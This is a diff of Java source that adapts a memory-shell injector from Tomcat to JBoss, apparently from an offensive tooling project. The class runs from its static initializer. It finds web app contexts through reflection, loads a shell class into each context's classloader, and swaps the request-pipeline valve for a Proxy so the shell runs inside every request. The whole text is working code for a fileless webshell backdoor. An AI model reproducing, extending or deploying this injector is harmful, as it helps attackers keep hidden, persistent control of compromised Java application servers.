@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.injector.tomcat;
+package com.reajason.javaweb.memshell.injector.jboss;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -7,25 +7,22 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  */
-public class TomcatProxyValveInjector implements InvocationHandler {
+public class JbossProxyValveInjector implements InvocationHandler {
 
     private Object rawValve;
     private Object proxyValve;
 
     static {
-        new TomcatProxyValveInjector();
+        new JbossProxyValveInjector();
     }
 
-    public TomcatProxyValveInjector() {
+    public JbossProxyValveInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
@@ -37,7 +34,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         }
     }
 
-    public TomcatProxyValveInjector(Object rawValve, Object proxyValve) {
+    public JbossProxyValveInjector(Object rawValve, Object proxyValve) {
         this.rawValve = rawValve;
         this.proxyValve = proxyValve;
     }
@@ -77,18 +74,23 @@ public class TomcatProxyValveInjector implements InvocationHandler {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
-            } else if (thread.getContextClassLoader() != null
-                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
-                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -113,7 +115,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
             fieldName = "basic";
             rawValve = getFieldValue(pipeline, fieldName);
         }
-        Object proxyValve = Proxy.newProxyInstance(contextClassLoader, new Class[]{valveClass}, new TomcatProxyValveInjector(rawValve, valve));
+        Object proxyValve = Proxy.newProxyInstance(contextClassLoader, new Class[]{valveClass}, new JbossProxyValveInjector(rawValve, valve));
         setFieldValue(pipeline, fieldName, proxyValve);
         System.out.println("proxyValve inject successful");
     }
